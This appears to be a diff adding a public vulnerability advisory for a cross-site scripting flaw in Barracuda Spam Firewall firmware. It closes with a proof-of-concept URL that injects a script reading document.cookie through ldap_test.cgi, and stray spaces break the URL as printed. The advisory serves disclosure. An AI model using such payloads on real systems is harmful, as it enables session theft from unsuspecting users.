@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/29340/info
+
+Barracuda Spam Firewall is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+Firmware prior to Barracuda Spam Firewall 3.5.11.025 is vulnerable. 
+
+https://www.example.com/cgi-bin/ldap_test.cgi?host=127.0.0.1&port=1&tl s_mode=tls_mode&tls_require=&username=&password=&filter=&searchbase=&uni que_attr=&email_attr=&domain=*&email=%3Cscript%3Ealert(document.cookie)% 3C/script%3E 
